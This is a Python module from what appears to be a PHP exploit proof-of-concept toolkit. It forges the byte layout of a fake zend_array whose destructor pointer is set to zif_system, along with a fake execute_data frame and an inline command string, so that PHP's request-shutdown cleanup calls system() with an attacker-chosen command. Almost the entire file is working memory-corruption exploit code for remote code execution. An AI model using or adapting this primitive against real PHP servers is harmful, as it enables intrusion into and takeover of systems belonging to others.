#!/usr/bin/env python3
# INDEX: forge fake zend_array carrier with system destructor | all
"""Byte-layout forge for a fake PHP zend_array (HashTable) RCE carrier.

Builds a fake zend_array whose pDestructor is zif_system plus a fake
execute_data and an inline command zend_string, so request-shutdown's
zend_array_destroy fires system(cmd).

Ported from mk_ht.py.
"""
import os
import struct
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.encode.zend_string_forge import pack_zend_string  # noqa: E402


def forge_zend_array(S, zif, cmd, size=384, arg1_ptr=None, zero_opline=True, call_slot=0):
    """The 384-byte `ht` value: a fake zend_array at S with
    pDestructor = zif_system, a fake execute_data at S+0x20 (also arData;
    num_args=1, arg1 -> S+0x80) and a fake zend_string command at S+0x80.
    Request shutdown's zend_array_destroy walks it and calls system(cmd).

    arg1_ptr: when given, arg1 (E+0x50) points at this EXTERNAL command address
    and NO inline zend_string is written (the command lives in a separate
    field); when None, arg1 -> S+0x80 and cmd is packed inline at S+0x80.
    zero_opline: when True the execute_data opline (E+0x00, overlapping
    HashTable.nTableSize) is written 0 last, zeroing nTableSize; when False
    nTableSize stays 8. call_slot: value for the execute_data call slot (E+0x08,
    overlapping HashTable.nNextFreeElement)."""
    ht = bytearray(size)
    # fake HashTable at S
    struct.pack_into("<II", ht, 0x00, 1, 7)              # gc: rc=1, IS_ARRAY
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)  # flags, nTableMask
    struct.pack_into("<Q", ht, 0x10, S + 0x20)           # arData
    struct.pack_into("<II", ht, 0x18, 1, 1)              # nNumUsed/nNumOfElements
    struct.pack_into("<II", ht, 0x20, 8, 0)              # nTableSize/pointer
    struct.pack_into("<Q", ht, 0x28, 0)                  # nNextFreeElement
    struct.pack_into("<Q", ht, 0x30, zif)                # pDestructor = zif_system
    # fake execute_data at E = S+0x20 (also the first bucket zval)
    E = 0x20
    if zero_opline:
        struct.pack_into("<Q", ht, E + 0x00, 0)          # opline
    struct.pack_into("<Q", ht, E + 0x08, call_slot)      # call
    struct.pack_into("<Q", ht, E + 0x10, zif)            # return_value
    struct.pack_into("<Q", ht, E + 0x18, 0)              # func
    struct.pack_into("<Q", ht, E + 0x20, 0)              # This.value
    struct.pack_into("<I", ht, E + 0x28, 0)              # This.u1.type_info
    struct.pack_into("<I", ht, E + 0x2C, 1)              # num_args = 1
    struct.pack_into("<Q", ht, E + 0x30, 0)              # prev_execute_data
    struct.pack_into("<Q", ht, E + 0x38, 0)              # symbol_table
    struct.pack_into("<I", ht, E + 0x40, 0)              # call_info
    if arg1_ptr is None:
        struct.pack_into("<Q", ht, E + 0x50, S + 0x80)   # arg1 value
    else:
        struct.pack_into("<Q", ht, E + 0x50, arg1_ptr)   # arg1 value
    struct.pack_into("<I", ht, E + 0x58, 6)              # arg1 IS_STRING
    if arg1_ptr is None:
        # fake zend_string (the command) at S+0x80
        pack_zend_string(ht, 0x80, len(cmd), refcount=1, type_info=0x106, val=cmd)
        ht[0x98 + len(cmd)] = 0
    return bytes(ht)
